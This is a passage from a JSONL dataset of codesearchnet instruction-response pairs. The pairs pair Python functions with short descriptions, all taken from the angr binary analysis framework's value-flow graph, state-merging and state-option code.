l.debug(\"Cannot create a new callstack for address %#x\", successor_addr)\n                job.dbg_exit_status[successor] = \"\"\n                return [ ]\n            new_call_stack_suffix = new_call_stack.stack_suffix(self._context_sensitivity_level)\n\n            new_function_key = FunctionKey.new(successor_addr, new_call_stack_suffix)\n            # Save the initial state for the function\n            self._save_function_initial_state(new_function_key, successor_addr, successor.copy())\n\n            # bail out if we hit the interfunction_level cap\n            if len(job.call_stack) >= self._interfunction_level:\n                l.debug('We are not tracing into a new function %#08x as we hit interfunction_level limit', successor_addr)\n\n                # mark it as skipped\n                job.dbg_exit_status[successor] = \"Skipped\"\n\n                job.call_skipped = True\n                job.call_function_key = new_function_key\n\n                job.call_task.skipped = True\n\n                return [ ]\n\n        elif jumpkind == 'Ijk_Ret':\n            # Pop the current function out from the call stack\n            new_call_stack = self._create_callstack(job, successor_addr, jumpkind, fakeret_successor)\n            if new_call_stack is None:\n                l.debug(\"Cannot create a new callstack for address %#x\", successor_addr)\n                job.dbg_exit_status[successor] = \"\"\n                return [ ]\n            new_call_stack_suffix = new_call_stack.stack_suffix(self._context_sensitivity_level)\n\n        else:\n            new_call_stack = job.call_stack\n            new_call_stack_suffix = job.call_stack_suffix\n\n        # Generate the new block ID\n        new_block_id = BlockID.new(successor_addr, new_call_stack_suffix, jumpkind)\n\n        #\n        # Generate new VFG jobs\n        #\n\n        if jumpkind == \"Ijk_Ret\":\n            assert not job.is_call_jump\n\n            # Record this return\n            self._return_target_sources[successor_addr].append(job.call_stack_suffix + (addr,))\n\n            # Check if this return is inside our pending returns list\n            if new_block_id in self._pending_returns:\n                del self._pending_returns[new_block_id]\n\n        # Check if we have reached a fix-point\n        if jumpkind != 'Ijk_FakeRet' and \\\n                new_block_id in self._nodes:\n            last_state = self._nodes[new_block_id].state\n\n            _, _, merged = last_state.merge(successor, plugin_whitelist=self._mergeable_plugins)\n\n            if merged:\n                l.debug(\"%s didn't reach a fix-point\", new_block_id)\n            else:\n                l.debug(\"%s reaches a fix-point.\", new_block_id)\n                job.dbg_exit_status[successor] = \"Merged due to reaching a fix-point\"\n                return [ ]\n\n        new_jobs = self._create_new_jobs(job, successor, new_block_id, new_call_stack)\n\n        return new_jobs", "response": "Process each successor generated by the job and return a list of new jobs."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ngenerate new jobs for all possible successor targets when there are more than one possible concrete value for successor.ip :param VFGJob job: The VFGJob instance. :param SimState successor: The succeeding state. :param list all_successors: All succeeding states from the same VFGJob. :return: A list of new succeeding jobs :rtype: list", "response": "def _handle_successor_multitargets(self, job, successor, all_successors):\n        \"\"\"\n        Generate new jobs for all possible successor targets when there are more than one possible concrete value for\n        successor.ip\n\n        :param VFGJob job: The VFGJob instance.\n        :param SimState successor: The succeeding state.\n        :param list all_successors: All succeeding states from the same VFGJob.\n        :return: A list of new succeeding jobs\n        :rtype: list\n        \"\"\"\n\n        new_jobs = [ ]\n\n        # Currently we assume a legit jumping target cannot have more than 256 concrete values\n        # TODO: make it a setting on VFG\n        MAX_NUMBER_OF_CONCRETE_VALUES = 256\n\n        all_possible_ips = successor.solver.eval_upto(successor.ip, MAX_NUMBER_OF_CONCRETE_VALUES + 1)\n\n        if len(all_possible_ips) > MAX_NUMBER_OF_CONCRETE_VALUES:\n            l.warning(\"IP can be concretized to more than %d values, which means it might be corrupted.\",\n                      MAX_NUMBER_OF_CONCRETE_VALUES)\n            return [ ]\n\n        # Call this function to generate a successor for each possible IP\n        for ip in all_possible_ips:\n            concrete_successor = successor.copy()\n            concrete_successor.ip = ip\n\n            concrete_jobs = self._handle_successor(job, concrete_successor, all_successors)\n\n            if job.is_call_jump:  # TODO: take care of syscalls\n                for new_job in concrete_jobs:\n                    # TODO: correctly fill the return address. The return address can be found from the\n                    # TODO: fakeret successor in the `successors` list\n                    function_analysis_task = FunctionAnalysis(new_job.addr, None)\n                    # log the new job\n                    function_analysis_task.jobs.append(new_job)\n                    # put it onto the stack\n                    self._task_stack.append(function_analysis_task)\n                    # log it in the call_task\n                    job.call_task.register_function_analysis(function_analysis_task)\n\n            new_jobs.extend(concrete_jobs)\n\n        return new_jobs"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nmerge two given states and return a new one.", "response": "def _merge_states(self, old_state, new_state):\n        \"\"\"\n        Merge two given states, and return a new one.\n\n        :param old_state:\n        :param new_state:\n        :returns: The merged state, and whether a merging has occurred\n        \"\"\"\n\n        # print old_state.dbg_print_stack()\n        # print new_state.dbg_print_stack()\n\n        merged_state, _, merging_occurred = old_state.merge(new_state, plugin_whitelist=self._mergeable_plugins)\n\n        # print \"Merged: \"\n        # print merged_state.dbg_print_stack()\n\n        return merged_state, merging_occurred"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _widen_states(old_state, new_state):\n\n        # print old_state.dbg_print_stack()\n        # print new_state.dbg_print_stack()\n\n        l.debug('Widening state at IP %s', old_state.ip)\n\n        widened_state, widening_occurred = old_state.widen(new_state)\n\n        # print \"Widened: \"\n        # print widened_state.dbg_print_stack()\n\n        return widened_state, widening_occurred", "response": "Perform widen operation on the given states and return a new state."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _narrow_states(node, old_state, new_state, previously_widened_state):  # pylint:disable=unused-argument,no-self-use\n\n        l.debug('Narrowing state at IP %s', previously_widened_state.ip)\n\n        s = previously_widened_state.copy()\n\n        narrowing_occurred = False\n\n        # TODO: Finish the narrowing logic\n\n        return s, narrowing_occurred", "response": "Narrow the state of a node."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nprepare the initial state for the analysis of the function.", "response": "def _prepare_initial_state(self, function_start, state):\n        \"\"\"\n        Get the state to start the analysis for function.\n\n        :param int function_start: Address of the function\n        :param SimState state: The program state to base on.\n        \"\"\"\n\n        if state is None:\n            state = self.project.factory.blank_state(mode=\"static\",\n                                                     remove_options=self._state_options_to_remove\n                                                     )\n\n        # make room for arguments passed to the function\n        sp = state.regs.sp\n        sp_val = state.solver.eval_one(sp)\n        state.memory.set_stack_address_mapping(sp_val,\n                                               state.memory.stack_id(function_start) + '_pre',\n                                               0\n                                               )\n        state.registers.store('sp', sp - 0x100)\n\n        # Set the stack address mapping for the initial stack\n        state.memory.set_stack_size(state.arch.stack_size)\n        initial_sp = state.solver.eval(state.regs.sp) # FIXME: This is bad, as it may lose tracking of multiple sp values\n        initial_sp -= state.arch.bytes\n        state.memory.set_stack_address_mapping(initial_sp,\n                                               state.memory.stack_id(function_start),\n                                               function_start\n                                               )\n\n        return state"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _set_return_address(self, state, ret_addr):\n\n        # TODO: the following code is totally untested other than X86 and AMD64. Don't freak out if you find bugs :)\n        # TODO: Test it\n\n        ret_bvv = state.solver.BVV(ret_addr, self.project.arch.bits)\n\n        if self.project.arch.name in ('X86', 'AMD64'):\n            state.stack_push(ret_bvv)\n        elif is_arm_arch(self.project.arch):\n            state.regs.lr = ret_bvv\n        elif self.project.arch.name in ('MIPS32', 'MIPS64'):\n            state.regs.ra = ret_bvv\n        elif self.project.arch.name in ('PPC32', 'PPC64'):\n            state.regs.lr = ret_bvv\n        else:\n            l.warning('Return address cannot be set for architecture %s. Please add corresponding logic to '\n                      'VFG._set_return_address().', self.project.arch.name\n                      )", "response": "Set the return address of the current state to a specific address."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _create_graph(self, return_target_sources=None):\n        if return_target_sources is None:\n            # We set it to a defaultdict in order to be consistent with the\n            # actual parameter.\n            return_target_sources = defaultdict(list)\n\n        cfg = networkx.DiGraph()\n        # The corner case: add a node to the graph if there is only one block\n        if len(self._nodes) == 1:\n            cfg.add_node(self._nodes[next(iter(self._nodes.keys()))])\n\n        # Adding edges\n        for tpl, targets in self._exit_targets.items():\n            basic_block = self._nodes[tpl] # Cannot fail :)\n            for ex, jumpkind in targets:\n                if ex in self._nodes:\n                    target_bbl = self._nodes[ex]\n                    cfg.add_edge(basic_block, target_bbl, jumpkind=jumpkind)\n\n                    # Add edges for possibly missing returns\n                    if basic_block.addr in return_target_sources:\n                        for src_irsb_key in \\\n                                return_target_sources[basic_block.addr]:\n                            cfg.add_edge(self._nodes[src_irsb_key],\n                                               basic_block, jumpkind=\"Ijk_Ret\")\n                else:\n                    # Debugging output\n                    def addr_formalize(addr):\n                        if addr is None:\n                            return \"None\"\n                        else:\n                            return \"%#08x\" % addr\n\n                    s = \"([\"\n                    for addr in ex[:-1]:\n                        s += addr_formalize(addr) + \", \"\n                    s += \"] %s)\" % addr_formalize(ex[-1])\n                    l.warning(\"Key %s does not exist.\", s)\n\n        return cfg", "response": "Create a DiGraph out of the existing edge map."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ngets an existing VFGNode instance from the graph.", "response": "def _graph_get_node(self, block_id, terminator_for_nonexistent_node=False):\n        \"\"\"\n        Get an existing VFGNode instance from the graph.\n\n        :param BlockID block_id:                     The block ID for the node to get.\n        :param bool terminator_for_nonexistent_node: True if a Terminator (which is a SimProcedure stub) should be\n                                                     created when there is no existing node available for the given\n                                                     block ID.\n        :return:                                     A node in the graph, or None.\n        :rtype:                                      VFGNode\n        \"\"\"\n\n        if block_id not in self._nodes:\n            l.error(\"Trying to look up a node that we don't have yet. Is this okay????\")\n            if not terminator_for_nonexistent_node:\n                return None\n            # Generate a PathTerminator node\n            addr = block_id.addr\n            func_addr = block_id.func_addr\n            if func_addr is None:\n                # We'll have to use the current block address instead\n                # TODO: Is it really OK?\n                func_addr = addr\n\n            input_state = self.project.factory.entry_state()\n            input_state.ip = addr\n            pt = VFGNode(addr, block_id, input_state)\n            self._nodes[block_id] = pt\n\n            if isinstance(self.project.arch, archinfo.ArchARM) and addr % 2 == 1:\n                self._thumb_addrs.add(addr)\n                self._thumb_addrs.add(addr - 1)\n\n            l.debug(\"Block ID %s does not exist. Create a PathTerminator instead.\",\n                    repr(block_id))\n\n        return self._nodes[block_id]"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nadd an edge from one source IRSB to another.", "response": "def _graph_add_edge(self, src_block_id, dst_block_id, **kwargs):\n        \"\"\"\n        Add an edge onto the graph.\n\n        :param BlockID src_block_id: The block ID for source node.\n        :param BlockID dst_block_id: The block Id for destination node.\n        :param str jumpkind:         The jumpkind of the edge.\n        :param exit_stmt_idx:        ID of the statement in the source IRSB where this edge is created from. 'default'\n                                     refers to the default exit.\n        :return: None\n        \"\"\"\n\n        dst_node = self._graph_get_node(dst_block_id, terminator_for_nonexistent_node=True)\n\n        if src_block_id is None:\n            self.graph.add_node(dst_node)\n\n        else:\n            src_node = self._graph_get_node(src_block_id, terminator_for_nonexistent_node=True)\n            self.graph.add_edge(src_node, dst_node, **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _create_new_jobs(self, job, successor, new_block_id, new_call_stack):\n\n        # TODO: basic block stack is probably useless\n\n        jumpkind = successor.history.jumpkind\n        stmt_idx = successor.scratch.stmt_idx\n        ins_addr = successor.scratch.ins_addr\n        # Make a copy of the state in case we use it later\n        successor_state = successor.copy()\n        successor_addr = successor_state.solver.eval(successor_state.ip)\n\n        new_jobs = [ ]\n\n        if jumpkind == \"Ijk_FakeRet\":\n            assert job.is_call_jump\n\n            # This is the default \"fake\" return successor generated at each call, if and only if the target function\n            # returns.\n\n            # if the call is skipped (for whatever reason, like we reached the interfunction tracing limit), we use\n            # this FakeRet successor as the final state of the function. Otherwise we save the FakeRet state in case the\n            # callee does not return normally, but don't process them right away.\n\n            # Clear the useless values (like return addresses, parameters) on stack if needed\n            if self._cfg is not None:\n                current_function = self.kb.functions.function(job.call_target)\n                if current_function is not None:\n                    sp_difference = current_function.sp_delta\n                else:\n                    sp_difference = 0\n                reg_sp_offset = successor_state.arch.sp_offset\n                reg_sp_expr = successor_state.registers.load(reg_sp_offset) + sp_difference\n                successor_state.registers.store(successor_state.arch.sp_offset, reg_sp_expr)\n\n                # Clear the return value with a TOP\n                top_si = successor_state.solver.TSI(successor_state.arch.bits)\n                successor_state.registers.store(successor_state.arch.ret_offset, top_si)\n\n            if job.call_skipped:\n\n                # TODO: Make sure the return values make sense\n                #if self.project.arch.name == 'X86':\n                #    successor_state.regs.eax = successor_state.solver.BVS('ret_val', 32, min=0, max=0xffffffff, stride=1)\n\n                new_job = VFGJob(successor_addr,\n                                 successor_state,\n                                 self._context_sensitivity_level,\n                                 block_id=new_block_id,\n                                 jumpkind='Ijk_Ret',\n                                 call_stack=new_call_stack,\n                                 src_block_id=job.block_id,\n                                 src_exit_stmt_idx=stmt_idx,\n                                 src_ins_addr=ins_addr,\n                                 )\n\n                new_jobs.append(new_job)\n                assert isinstance(self._task_stack[-2], FunctionAnalysis)\n                self._task_stack[-2].jobs.append(new_job)\n                job.dbg_exit_status[successor] = \"Pending\"\n\n            else:\n                self._pending_returns[new_block_id] = PendingJob(new_block_id, successor_state, new_call_stack,\n                                                                 job.block_id, stmt_idx, ins_addr)\n                job.dbg_exit_status[successor] = \"Pending\"\n\n        else:\n            if sim_options.ABSTRACT_MEMORY in successor.options:\n                if self._is_call_jumpkind(successor.history.jumpkind):\n                    # If this is a call, we create a new stack address mapping\n                    reg_sp_si = self._create_stack_region(successor_state, successor_addr)\n\n                    # Save the new sp register\n                    new_reg_sp_expr = successor_state.solver.ValueSet(successor_state.arch.bits,\n                                                                       'global',\n                                                                       0,\n                                                                       reg_sp_si\n                                                                       )\n                    successor_state.regs.sp = new_reg_sp_expr\n\n                elif successor.history.jumpkind == \"Ijk_Ret\":\n                    # Remove the existing stack address mapping\n                    # FIXME: Now we are assuming the sp is restored to its original value\n                    reg_sp_expr = successor_state.regs.sp\n\n                    if isinstance(reg_sp_expr._model_vsa, claripy.vsa.StridedInterval):\n                        reg_sp_si = reg_sp_expr._model_vsa\n                        reg_sp_val = reg_sp_si.min\n                    elif isinstance(reg_sp_expr._model_vsa, claripy.vsa.ValueSet):\n                        reg_sp_si = next(iter(reg_sp_expr._model_vsa.items()))[1]\n                        reg_sp_val = reg_sp_si.min\n                        # TODO: Finish it!\n\n            new_job = VFGJob(successor_addr,\n                             successor_state,\n                             self._context_sensitivity_level,\n                             block_id=new_block_id,\n                             jumpkind=successor_state.history.jumpkind,\n                             call_stack=new_call_stack,\n                             src_block_id=job.block_id,\n                             src_exit_stmt_idx=stmt_idx,\n                             src_ins_addr=ins_addr,\n                             )\n\n            if successor.history.jumpkind == 'Ijk_Ret':\n                # it's returning to the return site\n\n                # save the state as a final state of the function that we are returning from\n                if self._record_function_final_states:\n                    # key of the function that we are returning from\n                    source_function_key = FunctionKey.new(job.func_addr,\n                                                          job.call_stack_suffix\n                                                          )\n                    self._save_function_final_state(source_function_key, job.func_addr, successor_state)\n\n                # TODO: add an assertion that requires the returning target being the same as the return address we\n                # TODO: stored before\n\n                current_task = self._top_task\n                if current_task.call_analysis is not None:\n                    current_task.call_analysis.add_final_job(new_job)\n\n                    job.dbg_exit_status[successor] = \"Appended to the call analysis task\"\n                else:\n                    job.dbg_exit_status[successor] = \"Discarded (no call analysis task)\"\n\n            else:\n                if self._is_call_jumpkind(successor.history.jumpkind):\n                    # create a function analysis task\n                    # TODO: the return address\n                    task = FunctionAnalysis(new_job.addr, None)\n                    self._task_stack.append(task)\n                    # link it to the call analysis\n                    job.call_task.register_function_analysis(task)\n\n                else:\n                    task = self._top_task\n\n                # register the job to the function task\n                task.jobs.append(new_job)\n                # insert the new job into the new job array\n                new_jobs.append(new_job)\n\n                job.dbg_exit_status[successor] = \"Appended\"\n\n        if not job.is_call_jump or jumpkind != \"Ijk_FakeRet\":\n            new_target = (new_block_id, jumpkind)\n        else:\n            new_target = (new_block_id, \"Ijk_FakeRet\")  # This is the fake return!\n        self._exit_targets[job.call_stack_suffix + (job.addr,)].append(new_target)\n\n        return new_jobs", "response": "Create a list of new VFG jobs for the successor state."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nremoves all pending returns that are related to the current job.", "response": "def _remove_pending_return(self, job, pending_returns):\n        \"\"\"\n        Remove all pending returns that are related to the current job.\n        \"\"\"\n\n        # Build the tuples that we want to remove from the dict fake_func_retn_exits\n        tpls_to_remove = [ ]\n        call_stack_copy = job.call_stack_copy()\n        while call_stack_copy.current_return_target is not None:\n            ret_target = call_stack_copy.current_return_target\n            # Remove the current call stack frame\n            call_stack_copy = call_stack_copy.ret(ret_target)\n            call_stack_suffix = call_stack_copy.stack_suffix(self._context_sensitivity_level)\n            tpl = call_stack_suffix + (ret_target,)\n            tpls_to_remove.append(tpl)\n\n        # Remove those tuples from the dict\n        for tpl in tpls_to_remove:\n            if tpl in pending_returns:\n                del pending_returns[tpl]\n                l.debug(\"Removed (%s) from FakeExits dict.\",\n                        \",\".join([hex(i) if i is not None else 'None' for i in tpl]))"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nprints out debugging information after handling a VFGJob and generating the succeeding jobs.", "response": "def _post_job_handling_debug(self, job, successors):\n        \"\"\"\n        Print out debugging information after handling a VFGJob and generating the succeeding jobs.\n\n        :param VFGJob job: The VFGJob instance.\n        :param list successors: A list of succeeding states.\n        :return: None\n        \"\"\"\n\n        func = self.project.loader.find_symbol(job.addr)\n        function_name = func.name if func is not None else None\n        module_name = self.project.loader.find_object_containing(job.addr).provides\n\n        l.debug(\"VFGJob @ %#08x with callstack [ %s ]\", job.addr,\n                job.callstack_repr(self.kb),\n                )\n        l.debug(\"(Function %s of %s)\", function_name, module_name)\n        l.debug(\"-  is call jump: %s\", job.is_call_jump)\n        for suc in successors:\n            if suc not in job.dbg_exit_status:\n                l.warning(\"- %s is not found. FIND OUT WHY.\", suc)\n                continue\n\n            try:\n                l.debug(\"-  successor: %#08x of %s [%s]\", suc.solver.eval_one(suc.ip),\n                        suc.history.jumpkind, job.dbg_exit_status[suc])\n            except SimValueError:\n                l.debug(\"-  target cannot be concretized. %s [%s]\", job.dbg_exit_status[suc], suc.history.jumpkind)\n        l.debug(\"Remaining/pending jobs: %d/%d\", len(self._job_info_queue), len(self._pending_returns))\n        l.debug(\"Remaining jobs: %s\", [ \"%s %d\" % (ent.job, id(ent.job)) for ent in self._job_info_queue])\n        l.debug(\"Task stack: %s\", self._task_stack)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _save_function_initial_state(self, function_key, function_address, state):\n\n        l.debug('Saving the initial state for function %#08x with function key %s',\n                function_address,\n                function_key\n                )\n        if function_key in self._function_initial_states[function_address]:\n            existing_state = self._function_initial_states[function_address][function_key]\n            merged_state, _, _ = existing_state.merge(state)\n            self._function_initial_states[function_address][function_key] = merged_state\n\n        else:\n            self._function_initial_states[function_address][function_key] = state", "response": "Save the initial state of a function."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nsave the final state of a function.", "response": "def _save_function_final_state(self, function_key, function_address, state):\n        \"\"\"\n        Save the final state of a function, and merge it with existing ones if there are any.\n\n        :param FunctionKey function_key: The key to this function.\n        :param int function_address: Address of the function.\n        :param SimState state: Initial state of the function.\n        :return: None\n        \"\"\"\n\n        l.debug('Saving the final state for function %#08x with function key %s',\n                function_address,\n                function_key\n                )\n\n        if function_key in self._function_final_states[function_address]:\n            existing_state = self._function_final_states[function_address][function_key]\n            merged_state = existing_state.merge(state, plugin_whitelist=self._mergeable_plugins)[0]\n            self._function_final_states[function_address][function_key] = merged_state\n\n        else:\n            self._function_final_states[function_address][function_key] = state"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nget the possible simple paths between two addresses or node instances.", "response": "def _get_nx_paths(self, begin, end):\n        \"\"\"\n        Get the possible (networkx) simple paths between two nodes or addresses\n        corresponding to nodes.\n        Input: addresses or node instances\n        Return: a list of lists of nodes representing paths.\n        \"\"\"\n        if type(begin) is int and type(end) is int:  # pylint:disable=unidiomatic-typecheck\n            n_begin = self.get_any_node(begin)\n            n_end = self.get_any_node(end)\n\n        elif isinstance(begin, VFGNode) and isinstance(end, VFGNode):  # pylint:disable=unidiomatic-typecheck\n            n_begin = begin\n            n_end = end\n        else:\n            raise AngrVFGError(\"from and to should be of the same type\")\n\n        return networkx.all_simple_paths(self.graph, n_begin, n_end)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning the ordered merge points for a specific function.", "response": "def _merge_points(self, function_address):\n        \"\"\"\n        Return the ordered merge points for a specific function.\n\n        :param int function_address: Address of the querying function.\n        :return: A list of sorted merge points (addresses).\n        :rtype: list\n        \"\"\"\n\n        # we are entering a new function. now it's time to figure out how to optimally traverse the control flow\n        # graph by generating the sorted merge points\n        try:\n            new_function = self.kb.functions[function_address]\n        except KeyError:\n            # the function does not exist\n            return [ ]\n\n        if function_address not in self._function_merge_points:\n            ordered_merge_points = CFGUtils.find_merge_points(function_address, new_function.endpoints,\n                                                           new_function.graph)\n            self._function_merge_points[function_address] = ordered_merge_points\n\n        return self._function_merge_points[function_address]"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning the ordered widening points for a specific function.", "response": "def _widening_points(self, function_address):\n        \"\"\"\n        Return the ordered widening points for a specific function.\n\n        :param int function_address: Address of the querying function.\n        :return: A list of sorted merge points (addresses).\n        :rtype: list\n        \"\"\"\n\n        # we are entering a new function. now it's time to figure out how to optimally traverse the control flow\n        # graph by generating the sorted merge points\n        try:\n            new_function = self.kb.functions[function_address]\n        except KeyError:\n            # the function does not exist\n            return [ ]\n\n        if function_address not in self._function_widening_points:\n            if not new_function.normalized:\n                new_function.normalize()\n            widening_points = CFGUtils.find_widening_points(function_address, new_function.endpoints,\n                                                                    new_function.graph)\n            self._function_widening_points[function_address] = widening_points\n\n        return self._function_widening_points[function_address]"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _ordered_node_addrs(self, function_address):\n\n        try:\n            function = self.kb.functions[function_address]\n        except KeyError:\n            # the function does not exist\n            return [ ]\n\n        if function_address not in self._function_node_addrs:\n            sorted_nodes = CFGUtils.quasi_topological_sort_nodes(function.graph)\n            self._function_node_addrs[function_address] = [ n.addr for n in sorted_nodes ]\n\n        return self._function_node_addrs[function_address]", "response": "Returns a list of all nodes in an optimal traversal order."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef assign(self, dst_addr_ast):\n\n        if dst_addr_ast.uc_alloc_depth > self._max_alloc_depth:\n            raise SimUCManagerAllocationError('Current allocation depth %d is greater than the cap (%d)' % \\\n                (dst_addr_ast.uc_alloc_depth, self._max_alloc_depth))\n\n        abs_addr = self._region_base + self._pos\n        ptr = self.state.solver.BVV(abs_addr, self.state.arch.bits)\n        self._pos += self._region_size\n\n        self._alloc_depth_map[(abs_addr - self._region_base) // self._region_size] = dst_addr_ast.uc_alloc_depth\n\n        l.debug(\"Assigned new memory region %s\", ptr)\n        return ptr", "response": "Assign a new region for under - constrained symbolic execution."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef is_bounded(self, ast):\n\n        return len(ast.variables.intersection(self.state.solver._solver.variables)) != 0", "response": "Test whether an AST is bounded by any existing constraint in the related solver."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef resolve(self, cfg, addr, func_addr, block, jumpkind):\n\n        project = self.project\n\n        b = Blade(cfg.graph, addr, -1, cfg=cfg, project=project, ignore_sp=True, ignore_bp=True,\n                  ignored_regs=('gp',)\n                  )\n\n        sources = [n for n in b.slice.nodes() if b.slice.in_degree(n) == 0]\n        if not sources:\n            return False, []\n\n        source = sources[0]\n        source_addr = source[0]\n        annotated_cfg = AnnotatedCFG(project, None, detect_loops=False)\n        annotated_cfg.from_digraph(b.slice)\n\n        state = project.factory.blank_state(addr=source_addr, mode=\"fastpath\",\n                                            remove_options=options.refs\n                                            )\n        func = cfg.kb.functions.function(addr=func_addr)\n\n        gp_offset = project.arch.registers['gp'][0]\n        if 'gp' not in func.info:\n            sec = project.loader.find_section_containing(func.addr)\n            if sec is None or sec.name != '.plt':\n                # this might a special case: gp is only used once in this function, and it can be initialized right before\n                # its use site.\n                # TODO: handle this case\n                l.debug('Failed to determine value of register gp for function %#x.', func.addr)\n                return False, [ ]\n        else:\n            state.regs.gp = func.info['gp']\n\n        def overwrite_tmp_value(state):\n            state.inspect.tmp_write_expr = state.solver.BVV(func.info['gp'], state.arch.bits)\n\n        # Special handling for cases where `gp` is stored on the stack\n        got_gp_stack_store = False\n        for block_addr_in_slice in set(slice_node[0] for slice_node in b.slice.nodes()):\n            for stmt in project.factory.block(block_addr_in_slice).vex.statements:\n                if isinstance(stmt, pyvex.IRStmt.Put) and stmt.offset == gp_offset and \\\n                        isinstance(stmt.data, pyvex.IRExpr.RdTmp):\n                    tmp_offset = stmt.data.tmp  # pylint:disable=cell-var-from-loop\n                    # we must make sure value of that temporary variable equals to the correct gp value\n                    state.inspect.make_breakpoint('tmp_write', when=BP_BEFORE,\n                                                  condition=lambda s, bbl_addr_=block_addr_in_slice,\n                                                                   tmp_offset_=tmp_offset:\n                                                  s.scratch.bbl_addr == bbl_addr_ and s.inspect.tmp_write_num == tmp_offset_,\n                                                  action=overwrite_tmp_value\n                                                  )\n                    got_gp_stack_store = True\n                    break\n            if got_gp_stack_store:\n                break\n\n        simgr = self.project.factory.simulation_manager(state)\n        simgr.use_technique(Slicecutor(annotated_cfg))\n        simgr.run()\n\n        if simgr.cut:\n            target = simgr.cut[0].addr\n\n            if self._is_target_valid(cfg, target):\n                l.debug(\"Indirect jump at %#x is resolved to target %#x.\", addr, target)\n                return True, [ target ]\n\n            l.debug(\"Indirect jump at %#x is resolved to target %#x, which seems to be invalid.\", addr, target)\n            return False, [ ]\n\n        l.debug(\"Indirect jump at %#x cannot be resolved by %s.\", addr, repr(self))\n        return False, [ ]", "response": "Resolves the indirect jump in MIPS ELF binaries where all external function calls are indexed using gp."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nexecuting a procedure and returns a new state.", "response": "def process(self, state, procedure=None, force_addr=None, **kwargs):\n        \"\"\"\n        Perform execution with a state.\n\n        :param state:       The state with which to execute\n        :param procedure:   An instance of a SimProcedure to run, optional\n        :param ret_to:      The address to return to when this procedure is finished\n        :param inline:      This is an inline execution. Do not bother copying the state.\n        :param force_addr:  Force execution to pretend that we're working at this concrete address\n        :returns:           A SimSuccessors object categorizing the execution's successor states\n        \"\"\"\n        addr = state.addr if force_addr is None else force_addr\n\n        if procedure is None:\n            if addr not in self.project._sim_procedures:\n                if state.arch.name.startswith('ARM') and addr & 1 == 1 and addr - 1 in self.project._sim_procedures:\n                    procedure = self.project._sim_procedures[addr - 1]\n                else:\n                    return SimSuccessors.failure()\n            else:\n                procedure = self.project._sim_procedures[addr]\n\n        if isinstance(addr, SootAddressDescriptor):\n            l.debug(\"Running %s (originally at %r)\", repr(procedure), addr)\n        else:\n            l.debug(\"Running %s (originally at %#x)\", repr(procedure), addr)\n        return self.project.factory.procedure_engine.process(state, procedure, force_addr=force_addr, **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns a new instance with only the options that are in boolean_switches.", "response": "def difference(self, boolean_switches):\n        \"\"\"\n        [COMPATIBILITY]\n        Make a copy of the current instance, and then discard all options that are in boolean_switches.\n\n        :param set boolean_switches:    A collection of Boolean switches to disable.\n        :return:                        A new SimStateOptions instance.\n        \"\"\"\n\n        ops = SimStateOptions(self)\n        for key in boolean_switches:\n            ops.discard(key)\n        return ops"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning a string representation of all state options.", "response": "def tally(self, exclude_false=True, description=False):\n        \"\"\"\n        Return a string representation of all state options.\n\n        :param bool exclude_false:  Whether to exclude Boolean switches that are disabled.\n        :param bool description:    Whether to display the description of each option.\n        :return:                    A string representation.\n        :rtype:                     str\n        \"\"\"\n\n        total = [ ]\n\n        for o in sorted(self.OPTIONS.values(), key=lambda x: x.name):\n            try:\n                value = self[o.name]\n            except SimStateOptionsError:\n                value = \"<Unset>\"\n\n            if exclude_false and o.one_type() is bool and value is False:\n                # Skip Boolean switches that are False\n                continue\n\n            s = \"{option}: {value}\".format(option=o.name, value=value)\n            if description:\n                s += \" | {description}\".format(description=o.description)\n\n            total.append(s)\n\n        return \"\\n\".join(total)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nregistering a state option.", "response": "def register_option(cls, name, types, default=None, description=None):\n        \"\"\"\n        Register a state option.\n\n        :param str name:        Name of the state option.\n        :param types:           A collection of allowed types of this state option.\n        :param default:         The default value of this state option.\n        :param str description: The description of this state option.\n        :return:                None\n        \"\"\"\n\n        if name in cls.OPTIONS:\n            raise SimStateOptionsError(\"A state option with the same name has been registered.\")\n\n        if isinstance(types, type):\n            types = { types }\n\n        o = StateOption(name, types, default=default, description=description)\n        cls.OPTIONS[name] = o"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nregistering a Boolean switch as state option.", "response": "def register_bool_option(cls, name, description=None):\n        \"\"\"\n        Register a Boolean switch as state option.\n        This is equivalent to cls.register_option(name, set([bool]), description=description)\n\n        :param str name:        Name of the state option.\n        :param str description: The description of this state option.\n        :return:                None\n        \"\"\"\n\n        cls.register_option(name, { bool }, default=False, description=description)"}
